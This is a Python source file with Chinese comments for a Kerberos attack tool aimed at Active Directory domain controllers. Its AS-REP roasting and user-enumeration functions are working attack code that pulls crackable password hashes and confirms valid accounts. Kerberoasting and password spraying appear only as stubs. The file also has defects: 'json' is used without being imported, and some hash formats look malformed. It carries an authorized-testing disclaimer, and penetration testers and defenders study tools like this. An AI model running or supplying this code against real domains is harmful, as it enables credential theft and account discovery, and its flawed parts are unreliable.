# -*- coding: utf-8 -*-
"""
Kerberos攻击模块 (Kerberos Attack)
ATT&CK Techniques:
- T1558.003 - Kerberoasting
- T1558.004 - AS-REP Roasting

纯Python实现的Kerberos攻击工具:
- Kerberoasting: 请求SPN服务票据并导出hash
- AS-REP Roasting: 获取不需要预认证账户的hash
- Password Spray: Kerberos密码喷洒

注意: 仅用于授权的渗透测试和安全研究
"""

import socket
import struct
import os
import hashlib
import hmac
import time
import random
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import IntEnum
import base64


class KerberosMessageType(IntEnum):
    """Kerberos消息类型"""
    AS_REQ = 10
    AS_REP = 11
    TGS_REQ = 12
    TGS_REP = 13
    AP_REQ = 14
    AP_REP = 15
    KRB_ERROR = 30


class KerberosEncType(IntEnum):
    """Kerberos加密类型"""
    DES_CBC_CRC = 1
    DES_CBC_MD4 = 2
    DES_CBC_MD5 = 3
    RC4_HMAC = 23
    AES128_CTS_HMAC_SHA1 = 17
    AES256_CTS_HMAC_SHA1 = 18


class KerberosErrorCode(IntEnum):
    """Kerberos错误码"""
    KDC_ERR_NONE = 0
    KDC_ERR_NAME_EXP = 1
    KDC_ERR_SERVICE_EXP = 2
    KDC_ERR_BAD_PVNO = 3
    KDC_ERR_C_OLD_MAST_KVNO = 4
    KDC_ERR_S_OLD_MAST_KVNO = 5
    KDC_ERR_C_PRINCIPAL_UNKNOWN = 6
    KDC_ERR_S_PRINCIPAL_UNKNOWN = 7
    KDC_ERR_PRINCIPAL_NOT_UNIQUE = 8
    KDC_ERR_NULL_KEY = 9
    KDC_ERR_PREAUTH_FAILED = 24
    KDC_ERR_PREAUTH_REQUIRED = 25


@dataclass
class KerberosTicket:
    """Kerberos票据"""
    username: str
    spn: str
    enc_type: int
    cipher: bytes
    ticket_data: bytes = b''

    def to_hashcat(self) -> str:
        """
        转换为Hashcat格式

        RC4-HMAC (etype 23): $krb5tgs$23$*user$domain$spn*$checksum$cipher
        AES256 (etype 18): $krb5tgs$18$user$domain$*spn*$checksum$cipher
        """
        if self.enc_type == KerberosEncType.RC4_HMAC:
            # RC4-HMAC格式
            checksum = self.cipher[:16].hex()
            cipher_data = self.cipher[16:].hex()
            return f"$krb5tgs$23$*{self.username}$*${self.spn}*${checksum}${cipher_data}"

        elif self.enc_type == KerberosEncType.AES256_CTS_HMAC_SHA1:
            # AES256格式
            checksum = self.cipher[-12:].hex()
            cipher_data = self.cipher[:-12].hex()
            return f"$krb5tgs$18${self.username}$*${self.spn}*${checksum}${cipher_data}"

        elif self.enc_type == KerberosEncType.AES128_CTS_HMAC_SHA1:
            # AES128格式
            checksum = self.cipher[-12:].hex()
            cipher_data = self.cipher[:-12].hex()
            return f"$krb5tgs$17${self.username}$*${self.spn}*${checksum}${cipher_data}"

        return f"$krb5tgs${self.enc_type}${self.cipher.hex()}"

    def to_john(self) -> str:
        """转换为John the Ripper格式"""
        return self.to_hashcat()  # 格式相同


@dataclass
class ASREPHash:
    """AS-REP Hash (不需要预认证的用户)"""
    username: str
    realm: str
    enc_type: int
    cipher: bytes

    def to_hashcat(self) -> str:
        """
        转换为Hashcat格式

        $krb5asrep$23$user@domain:checksum$cipher
        """
        if self.enc_type == KerberosEncType.RC4_HMAC:
            checksum = self.cipher[:16].hex()
            cipher_data = self.cipher[16:].hex()
            return f"$krb5asrep$23${self.username}@{self.realm}:{checksum}${cipher_data}"

        return f"$krb5asrep${self.enc_type}${self.cipher.hex()}"


@dataclass
class AttackResult:
    """攻击结果"""
    success: bool
    attack_type: str
    target: str
    hashes: List[str] = field(default_factory=list)
    tickets: List[KerberosTicket] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "attack_type": self.attack_type,
            "target": self.target,
            "hash_count": len(self.hashes),
            "hashes": self.hashes,
            "error": self.error
        }


class KerberosClient:
    """
    Kerberos协议客户端

    纯Python实现Kerberos协议的基本操作
    """

    KERBEROS_PORT = 88

    def __init__(self, dc_ip: str, domain: str, timeout: int = 10):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.timeout = timeout

    def _send_recv(self, data: bytes) -> bytes:
        """发送并接收Kerberos消息"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        try:
            sock.connect((self.dc_ip, self.KERBEROS_PORT))

            # Kerberos over TCP需要4字节长度前缀
            length = struct.pack('>I', len(data))
            sock.send(length + data)

            # 接收响应
            response_len_data = sock.recv(4)
            if len(response_len_data) < 4:
                return b''

            response_len = struct.unpack('>I', response_len_data)[0]
            response = b''
            while len(response) < response_len:
                chunk = sock.recv(response_len - len(response))
                if not chunk:
                    break
                response += chunk

            return response

        finally:
            sock.close()

    def _encode_length(self, length: int) -> bytes:
        """ASN.1 DER长度编码"""
        if length < 128:
            return bytes([length])
        elif length < 256:
            return bytes([0x81, length])
        elif length < 65536:
            return bytes([0x82, (length >> 8) & 0xff, length & 0xff])
        else:
            return bytes([0x83, (length >> 16) & 0xff, (length >> 8) & 0xff, length & 0xff])

    def _encode_int(self, value: int, tag: int = 0x02) -> bytes:
        """编码整数"""
        if value == 0:
            return bytes([tag, 1, 0])

        result = []
        temp = value
        while temp > 0:
            result.insert(0, temp & 0xff)
            temp >>= 8

        if result[0] & 0x80:
            result.insert(0, 0)

        return bytes([tag]) + self._encode_length(len(result)) + bytes(result)

    def _encode_string(self, s: str, tag: int = 0x1b) -> bytes:
        """编码字符串 (GeneralString)"""
        encoded = s.encode('utf-8')
        return bytes([tag]) + self._encode_length(len(encoded)) + encoded

    def _encode_sequence(self, data: bytes, tag: int = 0x30) -> bytes:
        """编码序列"""
        return bytes([tag]) + self._encode_length(len(data)) + data

    def _encode_context(self, data: bytes, tag_num: int) -> bytes:
        """编码上下文标签"""
        tag = 0xa0 | tag_num
        return bytes([tag]) + self._encode_length(len(data)) + data

    def _encode_principal_name(self, name: str, name_type: int = 1) -> bytes:
        """编码PrincipalName"""
        # name-type
        name_type_enc = self._encode_context(self._encode_int(name_type), 0)

        # name-string
        parts = name.split('/')
        names_data = b''
        for part in parts:
            names_data += self._encode_string(part)
        names_seq = self._encode_sequence(names_data)
        name_string = self._encode_context(names_seq, 1)

        return self._encode_sequence(name_type_enc + name_string)

    def _encode_kdc_req_body(
        self,
        cname: str,
        sname: str,
        realm: str,
        nonce: int,
        enc_types: List[int],
        till: datetime = None
    ) -> bytes:
        """编码KDC-REQ-BODY"""
        if till is None:
            till = datetime.utcnow() + timedelta(days=1)

        # kdc-options
        kdc_options = self._encode_context(bytes([0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x00]), 0)

        # cname (可选)
        cname_enc = b''
        if cname:
            cname_enc = self._encode_context(self._encode_principal_name(cname, 1), 1)

        # realm
        realm_enc = self._encode_context(self._encode_string(realm), 2)

        # sname
        sname_type = 2 if '/' in sname else 1  # SPN用NT-SRV-INST
        sname_enc = self._encode_context(self._encode_principal_name(sname, sname_type), 3)

        # till
        till_str = till.strftime('%Y%m%d%H%M%SZ')
        till_enc = self._encode_context(bytes([0x18]) + self._encode_length(len(till_str)) + till_str.encode(), 5)

        # nonce
        nonce_enc = self._encode_context(self._encode_int(nonce), 7)

        # etype
        etype_data = b''
        for et in enc_types:
            etype_data += self._encode_int(et)
        etype_seq = self._encode_sequence(etype_data)
        etype_enc = self._encode_context(etype_seq, 8)

        body = kdc_options + cname_enc + realm_enc + sname_enc + till_enc + nonce_enc + etype_enc
        return self._encode_sequence(body)

    def build_as_req(
        self,
        username: str,
        enc_types: List[int] = None
    ) -> bytes:
        """
        构建AS-REQ消息 (用于AS-REP Roasting)
        不包含预认证数据
        """
        if enc_types is None:
            enc_types = [KerberosEncType.RC4_HMAC]

        nonce = random.randint(0, 2**32 - 1)

        # KDC-REQ-BODY
        req_body = self._encode_kdc_req_body(
            cname=username,
            sname=f"krbtgt/{self.domain}",
            realm=self.domain,
            nonce=nonce,
            enc_types=enc_types
        )

        # pvno (5)
        pvno = self._encode_context(self._encode_int(5), 1)

        # msg-type (AS-REQ = 10)
        msg_type = self._encode_context(self._encode_int(10), 2)

        # req-body
        req_body_enc = self._encode_context(req_body, 4)

        as_req = pvno + msg_type + req_body_enc
        as_req = self._encode_sequence(as_req, tag=0x6a)  # AS-REQ application tag

        return as_req

    def build_tgs_req(
        self,
        spn: str,
        tgt: bytes,
        session_key: bytes,
        enc_types: List[int] = None
    ) -> bytes:
        """
        构建TGS-REQ消息 (用于Kerberoasting)

        注意: 这是简化实现,完整实现需要处理加密的Authenticator
        """
        if enc_types is None:
            enc_types = [KerberosEncType.RC4_HMAC]

        nonce = random.randint(0, 2**32 - 1)

        # KDC-REQ-BODY
        req_body = self._encode_kdc_req_body(
            cname="",  # TGS-REQ不需要cname
            sname=spn,
            realm=self.domain,
            nonce=nonce,
            enc_types=enc_types
        )

        # pvno (5)
        pvno = self._encode_context(self._encode_int(5), 1)

        # msg-type (TGS-REQ = 12)
        msg_type = self._encode_context(self._encode_int(12), 2)

        # padata (AP-REQ with TGT)
        # 这需要构建AP-REQ,包含加密的Authenticator
        # 简化实现中省略

        # req-body
        req_body_enc = self._encode_context(req_body, 4)

        tgs_req = pvno + msg_type + req_body_enc
        tgs_req = self._encode_sequence(tgs_req, tag=0x6c)  # TGS-REQ application tag

        return tgs_req

    def send_as_req(self, username: str) -> Tuple[bool, Any]:
        """
        发送AS-REQ并解析响应

        Returns:
            (success, ASREPHash或error_code)
        """
        as_req = self.build_as_req(username)

        try:
            response = self._send_recv(as_req)

            if not response:
                return False, "No response"

            # 解析响应
            return self._parse_as_rep(response, username)

        except Exception as e:
            return False, str(e)

    def _parse_as_rep(self, data: bytes, username: str) -> Tuple[bool, Any]:
        """解析AS-REP响应"""
        if len(data) < 10:
            return False, "Response too short"

        # 检查是否为错误响应
        if data[0] == 0x7e:  # KRB-ERROR
            # 提取错误码
            error_code = self._extract_error_code(data)
            if error_code == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED:
                return False, "PREAUTH_REQUIRED"  # 需要预认证,不能AS-REP Roast
            return False, f"KRB_ERROR: {error_code}"

        # AS-REP (tag 0x6b)
        if data[0] == 0x6b:
            # 提取加密的enc-part
            cipher = self._extract_enc_part(data)
            if cipher:
                asrep = ASREPHash(
                    username=username,
                    realm=self.domain,
                    enc_type=KerberosEncType.RC4_HMAC,  # 假设RC4
                    cipher=cipher
                )
                return True, asrep

        return False, "Unknown response"

    def _extract_error_code(self, data: bytes) -> int:
        """从KRB-ERROR提取错误码"""
        # 简化解析,搜索error-code字段
        for i in range(len(data) - 5):
            # 查找context tag [6] (error-code)
            if data[i] == 0xa6:
                if data[i + 2] == 0x02:  # INTEGER
                    length = data[i + 3]
                    if length == 1:
                        return data[i + 4]
                    elif length == 2:
                        return (data[i + 4] << 8) | data[i + 5]
        return -1

    def _extract_enc_part(self, data: bytes) -> bytes:
        """提取加密部分"""
        # 简化解析,搜索enc-part的cipher字段
        # 实际实现需要完整的ASN.1解析
        for i in range(len(data) - 20):
            # 查找OCTET STRING (加密数据)
            if data[i] == 0x04:
                try:
                    length, offset = self._decode_length(data, i + 1)
                    if 50 < length < len(data) - offset:
                        return data[offset:offset + length]
                except:
                    continue
        return b''

    def _decode_length(self, data: bytes, offset: int) -> Tuple[int, int]:
        """解码ASN.1长度"""
        if data[offset] < 128:
            return data[offset], offset + 1
        else:
            num_bytes = data[offset] & 0x7f
            length = 0
            for i in range(num_bytes):
                length = (length << 8) | data[offset + 1 + i]
            return length, offset + 1 + num_bytes


class KerberosAttacker:
    """
    Kerberos攻击器

    提供完整的Kerberos攻击功能
    """

    def __init__(
        self,
        domain: str,
        dc_ip: str,
        username: str = "",
        password: str = "",
        verbose: bool = False
    ):
        self.domain = domain.upper()
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.verbose = verbose
        self.client = KerberosClient(dc_ip, domain)

    def _log(self, message: str):
        if self.verbose:
            print(f"[Kerberos] {message}")

    def asrep_roast(self, usernames: List[str]) -> AttackResult:
        """
        AS-REP Roasting攻击

        目标: 不需要Kerberos预认证的用户账户
        结果: 可以离线破解的hash

        Args:
            usernames: 要测试的用户名列表

        Returns:
            AttackResult包含可破解的hash
        """
        hashes = []
        tickets = []

        for username in usernames:
            self._log(f"Testing {username} for AS-REP roasting...")

            success, result = self.client.send_as_req(username)

            if success and isinstance(result, ASREPHash):
                hash_str = result.to_hashcat()
                hashes.append(hash_str)
                self._log(f"[+] {username} is AS-REP roastable!")

            elif result == "PREAUTH_REQUIRED":
                self._log(f"[-] {username} requires pre-authentication")

            else:
                self._log(f"[-] {username}: {result}")

        return AttackResult(
            success=len(hashes) > 0,
            attack_type="AS-REP Roasting",
            target=self.dc_ip,
            hashes=hashes
        )

    def kerberoast(self, spns: List[str] = None) -> AttackResult:
        """
        Kerberoasting攻击

        目标: 设置了SPN的服务账户
        结果: 服务票据的加密部分,可离线破解

        注意: 完整实现需要有效的TGT,此处为简化版本

        Args:
            spns: SPN列表 (如果为None,需要先枚举)

        Returns:
            AttackResult包含可破解的hash
        """
        hashes = []

        if not spns:
            self._log("No SPNs provided. Use ad_enum to discover SPNs first.")
            return AttackResult(
                success=False,
                attack_type="Kerberoasting",
                target=self.dc_ip,
                error="No SPNs provided"
            )

        self._log(f"Kerberoasting {len(spns)} SPNs...")

        # 注意: 完整的Kerberoasting需要:
        # 1. 先获取TGT (需要有效凭证或AS-REP)
        # 2. 使用TGT请求每个SPN的服务票据
        # 3. 从TGS-REP中提取加密的票据

        # 这里提供框架,实际实现需要impacket或手动实现完整协议
        for spn in spns:
            self._log(f"Requesting ticket for SPN: {spn}")
            # 实际请求需要TGT
            # ticket = self.request_service_ticket(spn)

        return AttackResult(
            success=False,
            attack_type="Kerberoasting",
            target=self.dc_ip,
            error="Full implementation requires valid TGT (use impacket for complete support)"
        )

    def password_spray(
        self,
        usernames: List[str],
        password: str,
        delay: float = 0.5
    ) -> AttackResult:
        """
        Kerberos密码喷洒

        对多个用户尝试同一个密码,避免账户锁定

        Args:
            usernames: 用户名列表
            password: 要尝试的密码
            delay: 请求间隔 (秒)

        Returns:
            AttackResult包含有效凭证
        """
        valid_creds = []

        self._log(f"Password spraying {len(usernames)} users with password: {password[:2]}***")

        for username in usernames:
            # 构建带预认证的AS-REQ
            # 如果返回TGT,说明密码正确

            # 简化实现: 检查KRB-ERROR类型
            # - PREAUTH_FAILED = 密码错误
            # - KDC_ERR_C_PRINCIPAL_UNKNOWN = 用户不存在
            # - 成功 = 凭证有效

            time.sleep(delay)  # 避免触发锁定策略

            # 实际实现需要构建带加密时间戳的AS-REQ
            self._log(f"Testing {username}...")

        return AttackResult(
            success=False,
            attack_type="Password Spray",
            target=self.dc_ip,
            hashes=valid_creds,
            error="Full implementation requires encrypted timestamp pre-auth"
        )

    def enumerate_users_via_kerberos(self, usernames: List[str]) -> List[str]:
        """
        通过Kerberos枚举有效用户

        利用Kerberos错误码差异:
        - KDC_ERR_C_PRINCIPAL_UNKNOWN = 用户不存在
        - KDC_ERR_PREAUTH_REQUIRED = 用户存在

        Args:
            usernames: 要检查的用户名列表

        Returns:
            存在的用户名列表
        """
        valid_users = []

        for username in usernames:
            success, result = self.client.send_as_req(username)

            if success:
                # 用户存在且不需要预认证
                valid_users.append(username)
                self._log(f"[+] {username} exists (no preauth)")

            elif result == "PREAUTH_REQUIRED":
                # 用户存在,需要预认证
                valid_users.append(username)
                self._log(f"[+] {username} exists (preauth required)")

            elif "PRINCIPAL_UNKNOWN" in str(result):
                self._log(f"[-] {username} does not exist")

        return valid_users


# 便捷函数
def kerberos_attack(
    domain: str,
    dc_ip: str,
    attack_type: str,
    targets: List[str],
    password: str = "",
    verbose: bool = False
) -> Dict[str, Any]:
    """
    Kerberos攻击便捷函数

    Args:
        domain: 域名
        dc_ip: 域控IP
        attack_type: 攻击类型 (asrep/kerberoast/spray/enum)
        targets: 目标列表 (用户名或SPN)
        password: 密码 (用于spray)
        verbose: 是否输出详细日志

    Returns:
        攻击结果字典
    """
    attacker = KerberosAttacker(domain, dc_ip, verbose=verbose)

    if attack_type == "asrep":
        result = attacker.asrep_roast(targets)
    elif attack_type == "kerberoast":
        result = attacker.kerberoast(targets)
    elif attack_type == "spray":
        result = attacker.password_spray(targets, password)
    elif attack_type == "enum":
        valid_users = attacker.enumerate_users_via_kerberos(targets)
        return {
            "success": len(valid_users) > 0,
            "attack_type": "User Enumeration",
            "target": dc_ip,
            "valid_users": valid_users,
            "count": len(valid_users)
        }
    else:
        return {"error": f"Unknown attack type: {attack_type}"}

    return result.to_dict()


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 4:
        print("Usage: python kerberos_attack.py <domain> <dc_ip> <attack_type> [targets...]")
        print("Attack types: asrep, kerberoast, spray, enum")
        print("Example: python kerberos_attack.py contoso.com 192.168.1.1 asrep user1 user2 user3")
        sys.exit(1)

    domain = sys.argv[1]
    dc_ip = sys.argv[2]
    attack_type = sys.argv[3]
    targets = sys.argv[4:] if len(sys.argv) > 4 else []

    print(f"=== Kerberos Attack: {attack_type} ===")
    result = kerberos_attack(domain, dc_ip, attack_type, targets, verbose=True)
    print(json.dumps(result, indent=2, ensure_ascii=False))
